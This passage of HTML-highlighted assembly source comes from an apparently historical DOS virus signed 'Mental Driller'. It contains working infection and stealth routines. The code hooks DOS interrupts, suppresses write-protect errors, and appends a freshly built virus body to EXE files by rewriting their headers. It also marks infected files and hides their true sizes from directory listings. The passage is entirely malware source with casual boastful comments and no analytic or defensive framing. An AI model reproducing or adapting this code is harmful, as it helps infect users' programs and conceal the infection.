        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@FinReInfeccion</span><span class="sc0">  </span><span class="sc1">; Then, jump</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">NoStealth</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; Set "NoStealth" value</span><span class="sc0">
                            </span><span class="sc1">; to 0</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@FinInt21h</span><span class="sc0">   </span><span class="sc1">; Jump and exit</span><span class="sc0">

</span><span class="sc1">;; The next code is made to avoid int 24h errors when you try to write a pro-</span><span class="sc0">
</span><span class="sc1">;; tected disk. I don't know why, but when you write to a handle, you close the</span><span class="sc0">
</span><span class="sc1">;; duplicated handle and unpatch the int 24h, when you close the handle comple-</span><span class="sc0">
</span><span class="sc1">;; tely, int 24h is called. So I had to investigate and I achieved to avoid</span><span class="sc0">
</span><span class="sc1">;; this problem performing this code (from "@@SEUUF" to "@@FinReinfeccion").</span><span class="sc0">
</span><span class="sc1">;; It doesn't matter if int 24h is patched when you close the handle. If you</span><span class="sc0">
</span><span class="sc1">;; try to do anything in a protected disk, only the virus activities will be</span><span class="sc0">
</span><span class="sc1">;; stealthed, but no the system activities (like it would seem to everybody</span><span class="sc0">
</span><span class="sc1">;; watching this) but don't ask me why it happens exactly :)</span><span class="sc0">
</span><span class="sc1">;; Maybe because MS-DOS is made by Shit-o-soft :)</span><span class="sc0">
     </span><span class="sc5">@@SEUUF</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">ParcheaInt24h</span><span class="sc0">   </span><span class="sc1">; Patch int 24h, 1Bh and 23h again</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">     </span><span class="sc1">; Close handle</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Int21h</span><span class="sc0">
        </span><span class="sc6">PUSHF</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">ParcheaInt24h</span><span class="sc0">   </span><span class="sc1">; Unpatch int 24h, 1Bh and 23h</span><span class="sc0">
        </span><span class="sc6">POPF</span><span class="sc0">
        </span><span class="sc6">RETF</span><span class="sc0">    </span><span class="sc2">0002</span><span class="sc0">        </span><span class="sc1">; Interrupt return</span><span class="sc0">
</span><span class="sc5">@@FinReinfeccion</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">      </span><span class="sc1">; Recover original AX and flags</span><span class="sc0">
        </span><span class="sc6">POPF</span><span class="sc0">
        </span><span class="sc6">RETF</span><span class="sc0">    </span><span class="sc2">0002</span><span class="sc0">        </span><span class="sc1">; Interrupt return</span><span class="sc0">

</span><span class="sc1">;; Memory write zone</span><span class="sc0">
</span><span class="sc5">Basura7</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;; Let's infect EXE files. EXE header is in DS:SI.</span><span class="sc0">
</span><span class="sc5">@@InfectaEXE</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">TipoEjec</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">; Executable type=EXE</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Save CS:IP and SS:SP</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">InicIP</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0"> </span><span class="sc1">; addresses on header</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">InicSS</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Get value on +12h</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; XOR it with SS</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'MD'</span><span class="sc0">       </span><span class="sc1">; Check if it is "MD", Mental Driller :)</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Fin03</span><span class="sc0">          </span><span class="sc1">; If it is (already infected), exit</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PtrFinal</span><span class="sc0">       </span><span class="sc1">; Go to the end of the file</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">       </span><span class="sc1">; Divide file size by 512</span><span class="sc0">
        </span><span class="sc6">DIV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">         </span><span class="sc1">; Check remainder</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Salto001</span><span class="sc0">       </span><span class="sc1">; If 0, jump</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">         </span><span class="sc1">; Round AX</span><span class="sc0">
</span><span class="sc5">@@Salto001</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">04</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Check file size in header. If it is</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Fin02</span><span class="sc0">       </span><span class="sc1">; different, exit</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">02</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Fin02</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PtrFinal</span><span class="sc0">       </span><span class="sc1">; Get file size again</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06h</span><span class="sc0">        </span><span class="sc1">; Check if file size is over 65536*5</span><span class="sc0">
        </span><span class="sc6">JAE</span><span class="sc0">   </span><span class="sc5">@@Fin02</span><span class="sc0">          </span><span class="sc1">; If it is, exit</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">         </span><span class="sc1">; Size &lt; 65536?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Salto002</span><span class="sc0">       </span><span class="sc1">; If it isn't, size is OK</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">      </span><span class="sc1">; If size &lt; 4096, exit</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">    </span><span class="sc5">@@Fin02</span><span class="sc0">
</span><span class="sc5">@@Salto002</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">MiraSiRoundedSize</span><span class="sc0"> </span><span class="sc1">; Check if rounded size (multiple of</span><span class="sc0">
                      </span><span class="sc1">; 512 or 500)</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Fin02</span><span class="sc0">          </span><span class="sc1">; If it is, exit</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">         </span><span class="sc1">; Save size onto stack</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">         </span><span class="sc1">; Put the low word of size in CX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">TamanyoReal</span><span class="sc0">    </span><span class="sc1">; Get the size the virus would have in</span><span class="sc0">
                       </span><span class="sc1">; this file in AX</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">         </span><span class="sc1">; Add it to the size of the file</span><span class="sc0">
        </span><span class="sc6">ADC</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc2">00</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">       </span><span class="sc1">; Divide it by 512</span><span class="sc0">
        </span><span class="sc6">DIV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Salto003</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">         </span><span class="sc1">; Round AX</span><span class="sc0">
</span><span class="sc5">@@Salto003</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">04</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">    </span><span class="sc1">; Put values on header</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">02</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">         </span><span class="sc1">; Recover file size</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0010h</span><span class="sc0">      </span><span class="sc1">; Divide it by 16</span><span class="sc0">
        </span><span class="sc6">DIV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Subtract header size in paragraphs</span><span class="sc0">
        </span><span class="sc6">JBE</span><span class="sc0">   </span><span class="sc5">@@Fin02</span><span class="sc0">          </span><span class="sc1">; If error, exit</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">   </span><span class="sc1">; Put result like new initial segment</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">         </span><span class="sc1">; Save AX onto stack</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">InicioVirus</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0"> </span><span class="sc1">; Put initial</span><span class="sc0">
                                 </span><span class="sc1">; delta-offset</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">         </span><span class="sc1">; Save DX onto stack</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">HazVirus</span><span class="sc0">       </span><span class="sc1">; Make a virus!</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">         </span><span class="sc1">; Recover DX in AX</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">         </span><span class="sc1">; Error?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@SaltoJAJA</span><span class="sc0">      </span><span class="sc1">; If not, continue</span><span class="sc0">
                       </span><span class="sc1">; Cool labels! :)</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">         </span><span class="sc1">; Nivelate stack</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Fin02</span><span class="sc0">          </span><span class="sc1">; Exit</span><span class="sc0">
  </span><span class="sc5">@@SaltoJAJA</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">         </span><span class="sc1">; Add displacement to decryptor to AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">   </span><span class="sc1">; Put it on the header</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">         </span><span class="sc1">; Recover initial segment from stack</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">LongVirus2</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0"> </span><span class="sc1">;Add virus size in paragraphs</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">         </span><span class="sc1">; DX=0</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">   </span><span class="sc1">; Put new SS:SP address</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">NewVirus</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc0"> </span><span class="sc1">; Write the constructed virus</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc0">          </span><span class="sc1">; to file</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Int21h</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">    </span><span class="sc5">@@Fin02</span><span class="sc0">          </span><span class="sc1">; If error, exit</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PtrInicio</span><span class="sc0">      </span><span class="sc1">; Go to the beginning of the file</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'MD'</span><span class="sc0">       </span><span class="sc1">; Put infection mark</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc0">        </span><span class="sc1">; Overwrite old header</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0018h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Int21h</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">    </span><span class="sc5">@@Fin02</span><span class="sc0">          </span><span class="sc1">; If error, don't set seconds to 60</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Fin03</span><span class="sc0">          </span><span class="sc1">; If there isn't error, set them to 60</span><span class="sc0">

</span><span class="sc1">;; Memory write zone</span><span class="sc0">
</span><span class="sc5">Basura8</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;;; DTA ADDRESS SETTING</span><span class="sc0">

</span><span class="sc5">@@NuevoDTA</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">DirecDTA</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">  </span><span class="sc1">; Save new direction</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">DirecDTA</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0"> </span><span class="sc1">; in our variables</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@FinInt21h</span><span class="sc0">

</span><span class="sc1">;;; DIRECTORY STEALTH</span><span class="sc0">

</span><span class="sc5">@@StealthDIR</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">Estado</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc0"> </span><span class="sc1">; Save function</span><span class="sc0">
        </span><span class="sc6">CLC</span><span class="sc0">           </span><span class="sc1">; Clear Carry-Flag</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">       </span><span class="sc1">; Call int 21h function</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Int21h</span><span class="sc0">
        </span><span class="sc6">PUSHF</span><span class="sc0">             </span><span class="sc1">; Save ALL</span><span class="sc0">
        </span><span class="sc6">PUSHA</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">    </span><span class="sc5">@@FinStealthDIR</span><span class="sc0">       </span><span class="sc1">; If error, exit</span><span class="sc0">
        </span><span class="sc6">LDS</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">DirecDTA</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get DTA address</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">Estado</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">12h</span><span class="sc0"> </span><span class="sc1">; Via FCBs?</span><span class="sc0">
        </span><span class="sc6">JBE</span><span class="sc0">   </span><span class="sc5">@@Stealth1001</span><span class="sc0">            </span><span class="sc1">; Then, jump here</span><span class="sc0">
</span><span class="sc5">@@Stealth2001</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc0">      </span><span class="sc1">; SI=-1</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFDh</span><span class="sc0">      </span><span class="sc1">; DI=-3</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@StealthX001</span><span class="sc0">     </span><span class="sc1">; Jump and continue</span><span class="sc0">
</span><span class="sc5">@@Stealth1001</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">          </span><span class="sc1">; AL=FF?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@FinStealthDIR</span><span class="sc0">       </span><span class="sc1">; Error, then exit</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">          </span><span class="sc1">; SI=DI=0</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0"> </span><span class="sc1">; ®Extended FCB?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@StealthX001</span><span class="sc0">     </span><span class="sc1">; If not, continue</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc2">07</span><span class="sc0">         </span><span class="sc1">; Add 7 to BX</span><span class="sc0">
</span><span class="sc5">@@StealthX001</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0017h</span><span class="sc0">       </span><span class="sc1">; Get time address on DTA fields</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get in AL the seconds</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Fh</span><span class="sc0">         </span><span class="sc1">; Are them set to 60?</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Eh</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@FinStealthDIR</span><span class="sc0">       </span><span class="sc1">; If they aren't, exit</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">08</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc2">00</span><span class="sc0"> </span><span class="sc1">; Check if size is very small</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@StealthX002</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">06</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">LongVirus2</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">    </span><span class="sc5">@@FinStealthDIR</span><span class="sc0">       </span><span class="sc1">; If very small, exit</span><span class="sc0">
</span><span class="sc5">@@StealthX002</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get real size of the virus in</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1FE0h</span><span class="sc0">       </span><span class="sc1">; AX</span><span class="sc0">
